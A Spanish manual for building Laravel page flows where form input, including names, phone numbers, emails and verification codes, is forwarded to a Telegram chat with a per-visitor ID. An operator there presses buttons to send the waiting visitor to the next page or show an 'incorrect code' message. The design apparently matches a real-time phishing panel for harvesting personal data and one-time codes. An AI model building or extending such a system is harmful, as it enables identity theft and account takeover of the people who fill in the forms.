# Manual de Creación de Vistas con Integración Telegram

Este manual describe cómo crear directorios de vistas que se integran automáticamente con Telegram para control de flujo mediante botones.

---

## Tabla de Contenidos

1. [Estructura General](#estructura-general)
2. [Crear un Nuevo Directorio de Vistas](#crear-un-nuevo-directorio-de-vistas)
3. [Marcador @telegram-button](#marcador-telegram-button)
4. [Componente x-control](#componente-x-control)
5. [Componente x-consulta](#componente-x-consulta)
6. [Vista de Espera (wait)](#vista-de-espera-wait)
7. [Sistema de Toast](#sistema-de-toast)
8. [Limpiar localStorage](#limpiar-localstorage)
9. [Casos de Uso por Tipo de Vista](#casos-de-uso-por-tipo-de-vista)
10. [Configuración de Botones](#configuración-de-botones)
11. [Información Enviada a Telegram](#información-enviada-a-telegram)
12. [Rutas en Laravel](#rutas-en-laravel)
13. [Flujo Completo](#flujo-completo)
14. [Ejemplo Práctico](#ejemplo-práctico)
15. [Nombres de Directorio Reservados](#nombres-de-directorio-reservados)

---

## Estructura General

```
resources/views/
└── {nombre-directorio}/
    ├── vista-1.blade.php      {{-- @telegram-button: Texto Botón 1 --}}
    ├── vista-2.blade.php      {{-- @telegram-button: Texto Botón 2 --}}
    ├── vista-3.blade.php      {{-- @telegram-button: Texto Botón 3 --}}
    └── wait.blade.php         (sin marcador - no aparece como botón)
```

---

## Crear un Nuevo Directorio de Vistas

### Paso 1: Crear el directorio

```bash
mkdir resources/views/mi-directorio
```

### Paso 2: Crear las vistas con marcador

Cada vista que quieras que aparezca como botón en Telegram debe tener el marcador `@telegram-button` al inicio del archivo.

### Paso 3: Crear la vista de espera

La vista `wait.blade.php` es la página intermedia donde el usuario espera mientras se selecciona una opción en Telegram.

### Paso 4: Configurar la ruta dinámica

En `routes/web.php`:

```php
Route::get('/mi-directorio/{vista}', function ($vista) {
    return view("mi-directorio.{$vista}");
});
```

### Paso 5: Agregar configuración de botones (opcional)

En `config/telegram_buttons.php`:

```php
'mi-directorio' => [
    'botones_por_fila' => 3,
],
```

---

## Marcador @telegram-button

El marcador define qué vistas aparecerán como botones en Telegram y qué texto mostrarán.

### Sintaxis

```blade
{{-- @telegram-button: Texto del Botón --}}
```

### Ubicación

Debe estar al inicio del archivo `.blade.php`, antes del `<!DOCTYPE html>`.

### Ejemplo

```blade
{{-- @telegram-button: Evaluación Inicial --}}
<!DOCTYPE html>
<html lang="es">
<head>
    ...
</head>
<body>
    ...
</body>
</html>
```

### Reglas

| Tiene marcador | ¿Aparece como botón? |
|----------------|---------------------|
| Sí | Sí |
| No | No |

### Texto del botón

El texto después de los dos puntos es exactamente lo que se muestra en el botón de Telegram:

| Marcador | Botón en Telegram |
|----------|-------------------|
| `{{-- @telegram-button: Paso 1 --}}` | Paso 1 |
| `{{-- @telegram-button: Verificar Datos --}}` | Verificar Datos |
| `{{-- @telegram-button: Confirmar --}}` | Confirmar |

---

## Componente x-control

El componente `<x-control />` maneja el localStorage, envío de formularios y configuración del sistema.

### Uso básico

```blade
<x-control />
```

Debe colocarse antes del cierre de `</body>`.

### Opciones disponibles

| Opción | Tipo | Default | Descripción |
|--------|------|---------|-------------|
| `auto-init` | boolean | `true` | Inicializa formulario automáticamente |
| `debug` | boolean | `true` | Muestra logs en consola |
| `auto-guardar` | boolean | `true` | Guarda automáticamente al cambiar campos |
| `auto-completar` | boolean | `true` | Pre-llena campos con datos guardados |
| `redirect-url` | string | `null` | URL de redirección después de envío |
| `redirect-delay` | number | `1500` | Delay en ms antes de redirigir |
| `toast-message` | string | `'Respuesta incorrecta, intente nuevamente'` | Mensaje del toast para cambio='2' |
| `limpiar-storage` | boolean | `false` | Limpia todo el localStorage al cargar la vista |

### Ejemplos de uso

```blade
{{-- Configuración por defecto --}}
<x-control />

{{-- Desactivar auto-guardado --}}
<x-control :auto-guardar="false" />

{{-- Desactivar auto-completar (no pre-llena campos) --}}
<x-control :auto-completar="false" />

{{-- Sin debug en consola --}}
<x-control :debug="false" />

{{-- Redirigir después de envío --}}
<x-control redirect-url="/mi-directorio/wait" />

{{-- Redirigir con delay personalizado --}}
<x-control redirect-url="/mi-directorio/wait" :redirect-delay="2000" />

{{-- Mensaje de toast personalizado --}}
<x-control toast-message="Los datos ingresados son incorrectos" />

{{-- Combinación de opciones --}}
<x-control
    :auto-guardar="false"
    :auto-completar="false"
    redirect-url="/mi-directorio/wait"
    toast-message="Intente nuevamente"
/>

{{-- Limpiar localStorage al cargar (para vistas finales) --}}
<x-control :limpiar-storage="true" />

{{-- Vista final sin inicialización de formulario --}}
<x-control :limpiar-storage="true" :auto-init="false" />
```

### Detección automática de directorio

El componente detecta automáticamente el directorio desde la URL:

| URL | Directorio detectado |
|-----|---------------------|
| `/prueba/evaluacion-1` | `prueba` |
| `/encuestas/satisfaccion` | `encuestas` |
| `/verificacion/paso-1` | `verificacion` |

---

## Componente x-consulta

El componente `<x-consulta />` inicia el polling para detectar cambios de status desde Telegram.

### Uso básico

```blade
<x-consulta />
```

### Opciones disponibles

| Opción | Tipo | Default | Descripción |
|--------|------|---------|-------------|
| `base-path` | string | `'/prueba'` | Ruta base para redirección |
| `interval` | number | `3000` | Intervalo de polling en ms |

### Ejemplos de uso

```blade
{{-- Configuración por defecto --}}
<x-consulta />

{{-- Especificar ruta base --}}
<x-consulta base-path="/mi-directorio" />

{{-- Polling más frecuente --}}
<x-consulta base-path="/mi-directorio" :interval="2000" />

{{-- Polling menos frecuente --}}
<x-consulta base-path="/mi-directorio" :interval="5000" />
```

---

## Vista de Espera (wait)

La vista `wait.blade.php` es donde el usuario espera mientras se selecciona una opción en Telegram.

### Características

- NO tiene marcador `@telegram-button` (no aparece como botón)
- Incluye `<x-consulta />` para hacer polling
- Muestra un spinner o mensaje de espera
- Redirige automáticamente cuando detecta cambio de status

### Plantilla básica

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Procesando...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            text-align: center;
            color: white;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Procesando...</h2>
        <p>Por favor espere mientras procesamos su solicitud</p>
    </div>

    <x-control :auto-init="true" :debug="false" />
    <x-consulta base-path="/mi-directorio" />
</body>
</html>
```

---

## Sistema de Toast

El sistema de toast muestra notificaciones cuando el polling retorna `cambio='2'`.

### Funcionamiento

1. El polling detecta `cambio='2'`
2. Guarda el mensaje en localStorage
3. Redirige a la vista correspondiente
4. Al cargar la vista, muestra el toast

### Personalizar mensaje por vista

Cada vista puede tener su propio mensaje de toast:

```blade
{{-- En evaluacion-1.blade.php --}}
<x-control toast-message="La respuesta de la evaluación 1 es incorrecta" />

{{-- En evaluacion-2.blade.php --}}
<x-control toast-message="Por favor revise los datos ingresados" />

{{-- En evaluacion-3.blade.php --}}
<x-control toast-message="Verificación fallida, intente nuevamente" />
```

### Estilo del toast

El toast aparece en la esquina superior derecha con:
- Fondo oscuro (#333)
- Texto blanco
- Animación de entrada/salida
- Desaparece automáticamente en 4 segundos

---

## Limpiar localStorage

La opción `limpiar-storage` permite borrar automáticamente todos los datos guardados en localStorage cuando se carga una vista.

### Cuándo usar

Ideal para vistas finales donde el flujo termina y se debe reiniciar el estado:
- Páginas de "Gracias"
- Confirmaciones de proceso completado
- Páginas de error final
- Cualquier vista donde se quiera reiniciar el flujo

### Qué se elimina

| Clave | Descripción |
|-------|-------------|
| `formularioCompleto` | Todos los datos del formulario guardados |
| `uniqid` | El identificador único del usuario |
| `toast_pendiente` | Mensajes de toast pendientes por mostrar |

### Ejemplo de vista final

```blade
{{-- gracias.blade.php --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proceso Completado</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        .container { text-align: center; color: white; }
        .icono { font-size: 64px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icono">✓</div>
        <h1>¡Proceso Completado!</h1>
        <p>Gracias por su tiempo.</p>
        <a href="/inicio" style="color: white;">Volver al inicio</a>
    </div>

    <x-control :limpiar-storage="true" :auto-init="false" :debug="false" />
</body>
</html>
```

### Log en consola

Si `debug` está activo, al cargar la vista se mostrará:
```
🗑️ localStorage limpiado al cargar la vista
```

---

## Casos de Uso por Tipo de Vista

Esta sección describe las configuraciones recomendadas de los componentes según el tipo de vista que se esté creando.

### Resumen Rápido de Configuraciones

| Tipo de Vista | Componentes | Configuración Clave |
|---------------|-------------|---------------------|
| Formulario con envío | `x-control` | `redirect-url`, `toast-message` |
| Vista de espera | `x-control` + `x-consulta` | `base-path`, `:auto-init="true"` |
| Vista intermedia (sin formulario) | `x-control` | `:auto-guardar="false"` |
| Vista final | `x-control` | `:limpiar-storage="true"` |
| Vista de solo lectura | `x-control` | `:auto-init="false"` |

---

### 1. Vista con Formulario y Envío

**Uso:** Primera vista del flujo donde el usuario ingresa datos.

```blade
{{-- @telegram-button: Datos Personales --}}
{{-- @toast-message: Los datos ingresados no son válidos --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Formulario</title>
</head>
<body>
    <form id="formDatos">
        <input type="text" id="nombre" name="nombre" required>
        <input type="email" id="email" name="email" required>
        <input type="hidden" id="no-status" name="status" value="datos">
        <button type="submit" id="enviar">Enviar</button>
    </form>
    <div id="mensaje"></div>

    <x-control
        :auto-completar="false"
        redirect-url="/mi-flujo/wait"
        toast-message="Datos incorrectos, verifique e intente de nuevo"
    />
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `auto-completar` | `false` | No pre-llenar campos (primera vez) |
| `redirect-url` | `/mi-flujo/wait` | Redirigir a espera tras envío |
| `toast-message` | Personalizado | Mensaje si se rechaza y vuelve |

---

### 2. Vista con Formulario de Reingreso

**Uso:** Vista donde el usuario puede volver a ingresar datos (ej: código de verificación).

```blade
{{-- @telegram-button: Verificar Código --}}
{{-- @toast-message: El código ingresado no es válido, solicite uno nuevo --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Verificar Código</title>
</head>
<body>
    <form id="formCodigo">
        <input type="tel" id="codigo" name="codigo" required>
        <input type="hidden" id="no-status" name="status" value="verificar-codigo">
        <button type="submit" id="enviar">Verificar</button>
    </form>
    <div id="mensaje"></div>

    <x-control
        :auto-completar="true"
        :auto-guardar="true"
        redirect-url="/mi-flujo/wait"
        toast-message="El código es incorrecto, intente nuevamente"
    />
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `auto-completar` | `true` | Pre-llenar con datos previos |
| `auto-guardar` | `true` | Guardar cambios automáticamente |
| `redirect-url` | `/mi-flujo/wait` | Redirigir tras envío |
| `toast-message` | Personalizado | Mensaje de error específico |

---

### 3. Vista de Espera (Polling)

**Uso:** Vista donde el usuario espera mientras se procesa en Telegram.

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Procesando...</title>
</head>
<body>
    <div class="spinner"></div>
    <p>Procesando su solicitud...</p>

    <x-control :auto-init="true" :debug="false" />
    <x-consulta base-path="/mi-flujo" :interval="3000" />
</body>
</html>
```

**Configuración explicada:**
| Componente | Opción | Valor | Razón |
|------------|--------|-------|-------|
| `x-control` | `auto-init` | `true` | Mantener datos en localStorage |
| `x-control` | `debug` | `false` | Sin logs en producción |
| `x-consulta` | `base-path` | `/mi-flujo` | Ruta base para redirección |
| `x-consulta` | `interval` | `3000` | Consultar cada 3 segundos |

**Intervalos recomendados:**
| Intervalo | Uso recomendado |
|-----------|-----------------|
| `2000` (2s) | Respuesta rápida esperada |
| `3000` (3s) | Uso general (recomendado) |
| `5000` (5s) | Procesos largos, menor carga |

---

### 4. Vista Intermedia (Sin Formulario)

**Uso:** Vista informativa entre pasos, sin campos de entrada.

```blade
{{-- @telegram-button: Información --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Información Importante</title>
</head>
<body>
    <h1>Información Importante</h1>
    <p>Lea atentamente antes de continuar...</p>

    <form id="formContinuar">
        <input type="hidden" id="no-status" name="status" value="informacion">
        <button type="submit" id="enviar">Continuar</button>
    </form>
    <div id="mensaje"></div>

    <x-control
        :auto-guardar="false"
        :auto-completar="false"
        redirect-url="/mi-flujo/wait"
    />
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `auto-guardar` | `false` | No hay campos que guardar |
| `auto-completar` | `false` | No hay campos que completar |
| `redirect-url` | Configurado | Continúa el flujo |

---

### 5. Vista Final (Proceso Completado)

**Uso:** Última vista del flujo, limpia el estado para reiniciar.

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proceso Completado</title>
</head>
<body>
    <h1>¡Gracias!</h1>
    <p>Su proceso ha sido completado exitosamente.</p>
    <a href="/inicio">Volver al inicio</a>

    <x-control
        :limpiar-storage="true"
        :auto-init="false"
        :debug="false"
    />
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `limpiar-storage` | `true` | Elimina todos los datos guardados |
| `auto-init` | `false` | No hay formulario que inicializar |
| `debug` | `false` | Sin logs en producción |

---

### 6. Vista de Solo Lectura

**Uso:** Vista que muestra datos pero no permite edición.

```blade
{{-- @telegram-button: Resumen --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Resumen de Datos</title>
</head>
<body>
    <h1>Resumen de sus datos</h1>
    <div id="resumen">
        <!-- Los datos se mostrarán aquí via JavaScript -->
    </div>

    <form id="formConfirmar">
        <input type="hidden" id="no-status" name="status" value="resumen">
        <button type="submit" id="enviar">Confirmar</button>
    </form>
    <div id="mensaje"></div>

    <x-control
        :auto-init="false"
        :auto-guardar="false"
        redirect-url="/mi-flujo/wait"
    />

    <script>
        // Mostrar datos guardados en el resumen
        document.addEventListener('DOMContentLoaded', function() {
            const datos = obtenerFormulario();
            document.getElementById('resumen').innerHTML = `
                <p><strong>Nombre:</strong> ${datos.nombre || 'N/A'}</p>
                <p><strong>Email:</strong> ${datos.email || 'N/A'}</p>
            `;
        });
    </script>
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `auto-init` | `false` | No detectar campos automáticamente |
| `auto-guardar` | `false` | No modificar datos existentes |
| `redirect-url` | Configurado | Continúa el flujo |

---

### 7. Vista de Error

**Uso:** Vista que se muestra cuando hay un error fatal en el proceso.

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>
    <h1>Ha ocurrido un error</h1>
    <p>Lo sentimos, no pudimos procesar su solicitud.</p>
    <a href="/mi-flujo/inicio">Intentar nuevamente</a>

    <x-control
        :limpiar-storage="true"
        :auto-init="false"
        :debug="false"
    />
</body>
</html>
```

**Configuración explicada:**
| Opción | Valor | Razón |
|--------|-------|-------|
| `limpiar-storage` | `true` | Reiniciar estado para nuevo intento |
| `auto-init` | `false` | No hay formulario |
| `debug` | `false` | Sin logs |

---

### Matriz de Configuración Completa

| Tipo de Vista | auto-init | auto-guardar | auto-completar | redirect-url | limpiar-storage | x-consulta |
|---------------|:---------:|:------------:|:--------------:|:------------:|:---------------:|:----------:|
| Formulario inicial | ✅ | ✅ | ❌ | ✅ | ❌ | ❌ |
| Formulario reingreso | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ |
| Vista de espera | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ |
| Vista intermedia | ✅ | ❌ | ❌ | ✅ | ❌ | ❌ |
| Vista final | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ |
| Solo lectura | ❌ | ❌ | ❌ | ✅ | ❌ | ❌ |
| Vista de error | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ |

**Leyenda:** ✅ = `true` / Configurado | ❌ = `false` / No usado

---

## Configuración de Botones

### Archivo de configuración

`config/telegram_buttons.php`

```php
<?php

return [
    'prueba' => [
        'botones_por_fila' => 3,
    ],
    'encuestas' => [
        'botones_por_fila' => 2,
    ],
    'verificacion' => [
        'botones_por_fila' => 3,
    ],
];
```

### Botones por fila

Define cuántos botones aparecen en cada fila del teclado inline de Telegram:

| Configuración | Resultado |
|---------------|-----------|
| `'botones_por_fila' => 3` | `[Btn1] [Btn2] [Btn3]` |
| `'botones_por_fila' => 2` | `[Btn1] [Btn2]`<br>`[Btn3]` |
| `'botones_por_fila' => 1` | `[Btn1]`<br>`[Btn2]`<br>`[Btn3]` |

---

## Información Enviada a Telegram

Cuando se envía un formulario, el sistema envía un mensaje a Telegram con la siguiente información:

### Estructura del Mensaje

```
🆕 NUEVA ENTRADA

ID: 45
UniqID: user_1737482945_abc123def
Status: telefono
Directorio: verificacion
Fecha: 2026-01-21 15:30:00

Datos:
  • nombre: Juan Pérez
  • email: juan@ejemplo.com
  • telefono: 3001234567
  • codigo: 123456

[Teléfono] [Correo] [Identidad]
```

### Campos del Mensaje

| Campo | Descripción | Origen |
|-------|-------------|--------|
| **Acción** | Indica si es nueva entrada o actualización | Sistema (🆕 NUEVA ENTRADA / 🔄 ENTRADA ACTUALIZADA) |
| **ID** | ID de la entrada en la base de datos | Base de datos |
| **UniqID** | Identificador único del usuario | localStorage (`uniqid`) |
| **Status** | Estado actual de la entrada | Campo hidden `no-status` |
| **Directorio** | Directorio de vistas del flujo | Detectado desde URL (`request()->segment(1)`) |
| **Fecha** | Fecha y hora de creación | Base de datos |
| **Datos** | Todos los campos del formulario | localStorage (`formularioCompleto`) |

### Datos del Formulario

Los datos enviados provienen del localStorage y incluyen todos los campos guardados:

```json
{
    "directorio": "verificacion",
    "nombre": "Juan Pérez",
    "email": "juan@ejemplo.com",
    "telefono": "3001234567",
    "codigo": "123456",
    "status": "telefono"
}
```

**Nota:** Los campos con prefijo `no-` (como `no-status`) son ignorados por el auto-guardado, pero el valor de `status` se envía explícitamente al servidor.

### Botones Inline

Los botones que aparecen en el mensaje se generan automáticamente desde las vistas del directorio que tienen el marcador `@telegram-button`:

```
[Teléfono] [Correo] [Identidad]
```

Cada botón contiene un `callback_data` con formato: `t-{vista}:{uniqid}`

Ejemplo: `t-telefono:user_1737482945_abc123def`

### Flujo de Datos

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Usuario llena formulario en el navegador                 │
│    └─ Datos se guardan en localStorage                      │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Usuario hace submit                                      │
│    └─ POST /api/entradas/sync                               │
│    └─ Body: { uniqid, datos, status, directorio }           │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Servidor procesa la entrada                              │
│    └─ Guarda en base de datos                               │
│    └─ Llama a TelegramController::sendEntradaMessage()      │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. TelegramController construye el mensaje                  │
│    └─ Incluye: ID, UniqID, Status, Directorio, Fecha        │
│    └─ Formatea los datos del formulario                     │
│    └─ Genera botones desde vistas con @telegram-button      │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Mensaje enviado a Telegram                               │
│    └─ API: https://api.telegram.org/bot{token}/sendMessage  │
│    └─ Chat ID configurado en .env                           │
└─────────────────────────────────────────────────────────────┘
```

### Configuración de Telegram

Variables de entorno en `.env`:

```env
TELEGRAM_ENTRADAS_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_ENTRADAS_CHAT_ID=-1001234567890
```

---

## Rutas en Laravel

### Ruta dinámica (recomendado)

```php
// routes/web.php

Route::get('/mi-directorio/{vista}', function ($vista) {
    return view("mi-directorio.{$vista}");
});
```

### Rutas individuales (alternativa)

```php
// routes/web.php

Route::get('/mi-directorio/paso-1', fn() => view('mi-directorio.paso-1'));
Route::get('/mi-directorio/paso-2', fn() => view('mi-directorio.paso-2'));
Route::get('/mi-directorio/paso-3', fn() => view('mi-directorio.paso-3'));
Route::get('/mi-directorio/wait', fn() => view('mi-directorio.wait'));
```

---

## Flujo Completo

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Usuario accede a /mi-directorio/paso-1                   │
│    └─ Vista carga con <x-control />                         │
│    └─ Directorio "mi-directorio" detectado automáticamente  │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Usuario llena formulario                                 │
│    └─ Datos se guardan en localStorage automáticamente      │
│    └─ JSON: { "directorio": "mi-directorio", ... }          │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Usuario envía formulario                                 │
│    └─ Datos + directorio se envían a /api/entradas/sync     │
│    └─ Redirige a /mi-directorio/wait                        │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Servidor procesa y envía a Telegram                      │
│    └─ TelegramButtonService escanea mi-directorio/          │
│    └─ Genera botones de vistas con @telegram-button         │
│    └─ Envía mensaje con botones a Telegram                  │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Vista wait hace polling                                  │
│    └─ <x-consulta base-path="/mi-directorio" />             │
│    └─ Consulta /api/entradas/status/{uniqid}                │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. Operador presiona botón en Telegram                      │
│    └─ Webhook actualiza status en DB: "t-paso-2"            │
└──────────────────────────┬──────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 7. Polling detecta cambio                                   │
│    └─ cambio='1': Redirige a /mi-directorio/paso-2          │
│    └─ cambio='2': Redirige + muestra toast                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Ejemplo Práctico

### Crear directorio "encuestas"

#### 1. Crear estructura de archivos

```
resources/views/encuestas/
├── satisfaccion.blade.php
├── recomendacion.blade.php
├── comentarios.blade.php
└── wait.blade.php
```

#### 2. Vista satisfaccion.blade.php

```blade
{{-- @telegram-button: Satisfacción --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Encuesta de Satisfacción</title>
    <style>
        /* Estilos aquí */
    </style>
</head>
<body>
    <div class="container">
        <h1>Encuesta de Satisfacción</h1>
        <form id="formEncuesta">
            <div class="pregunta">
                <label for="calificacion">¿Cómo califica nuestro servicio?</label>
                <select id="calificacion" name="calificacion" required>
                    <option value="">Seleccione...</option>
                    <option value="5">Excelente</option>
                    <option value="4">Bueno</option>
                    <option value="3">Regular</option>
                    <option value="2">Malo</option>
                    <option value="1">Muy malo</option>
                </select>
            </div>
            <input type="hidden" id="no-status" name="status" value="satisfaccion">
            <button type="submit" id="enviar">Enviar</button>
        </form>
    </div>

    <x-control
        :auto-completar="false"
        redirect-url="/encuestas/wait"
        toast-message="Por favor complete todos los campos correctamente"
    />
</body>
</html>
```

#### 3. Vista wait.blade.php

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Procesando Encuesta...</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        .container { text-align: center; color: white; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Procesando su encuesta...</h2>
        <p>Por favor espere</p>
    </div>

    <x-control :auto-init="true" :debug="false" />
    <x-consulta base-path="/encuestas" />
</body>
</html>
```

#### 4. Configurar ruta

```php
// routes/web.php

Route::get('/encuestas/{vista}', function ($vista) {
    return view("encuestas.{$vista}");
});
```

#### 5. Configurar botones (opcional)

```php
// config/telegram_buttons.php

return [
    'prueba' => [
        'botones_por_fila' => 3,
    ],
    'encuestas' => [
        'botones_por_fila' => 3,
    ],
];
```

#### Resultado en Telegram

Cuando se envíe la encuesta, aparecerán los botones:

```
[Satisfacción] [Recomendación] [Comentarios]
```

---

## Nombres de Directorio Reservados

Los siguientes nombres **NO deben usarse** como nombres de directorios de vistas porque están reservados para el sistema de autenticación y administración:

| Nombre Reservado | Uso del Sistema |
|------------------|-----------------|
| `auth` | Sistema de autenticación (login, registro, logout) |
| `dashboard` | Panel de control y gestión de usuarios |
| `admin` | Administración (aprobación de usuarios) |

### Por qué están reservados

En `routes/web.php`, las rutas están organizadas por prioridad:

```php
// 1. Rutas específicas (tienen prioridad)
Route::prefix('auth')->group(...);      // /auth/*
Route::prefix('dashboard')->group(...); // /dashboard/*
Route::prefix('admin')->group(...);     // /admin/*

// 2. Rutas catch-all (se procesan al final)
Route::get('/{panel}/{view}', ...);     // /{directorio}/{vista}
```

Si creas un directorio de vistas llamado `auth`, `dashboard` o `admin`, las rutas del sistema de autenticación tendrán prioridad y tus vistas no serán accesibles.

### Ejemplo de conflicto

```
❌ resources/views/auth/paso-1.blade.php
   URL /auth/paso-1 → NO funciona (va a AuthController)

✅ resources/views/autenticacion/paso-1.blade.php
   URL /autenticacion/paso-1 → Funciona correctamente
```

### Nombres válidos

Puedes usar cualquier otro nombre para tus directorios:

| Válido | Inválido |
|--------|----------|
| `prueba` | `auth` |
| `verificacion` | `dashboard` |
| `encuestas` | `admin` |
| `kassio` | |
| `registro-usuario` | |
| `validacion` | |

---

## Resumen de Archivos del Sistema

| Archivo | Descripción |
|---------|-------------|
| `app/Services/TelegramButtonService.php` | Escanea vistas y genera botones |
| `app/Http/Controllers/TelegramController.php` | Envía mensajes a Telegram |
| `app/Http/Controllers/EntradaController.php` | Maneja entradas y pasa directorio |
| `config/telegram_buttons.php` | Configuración de botones por directorio |
| `public/js/localStorage-utils-auto.js` | Sistema de localStorage, polling y toast |
| `resources/views/components/control.blade.php` | Componente x-control |
| `resources/views/components/consulta.blade.php` | Componente x-consulta |

---

## Checklist para Nuevo Directorio

- [ ] **Verificar que el nombre NO sea reservado** (`auth`, `dashboard`, `admin`)
- [ ] Crear directorio en `resources/views/`
- [ ] Crear vistas con marcador `@telegram-button`
- [ ] Crear vista `wait.blade.php` sin marcador
- [ ] Agregar `<x-control />` a cada vista con formulario
- [ ] Agregar `<x-consulta base-path="/mi-directorio" />` a wait.blade.php
- [ ] Configurar ruta dinámica en `routes/web.php`
- [ ] (Opcional) Configurar `botones_por_fila` en `config/telegram_buttons.php`
- [ ] (Opcional) Crear vista final con `<x-control :limpiar-storage="true" />` para reiniciar el flujo
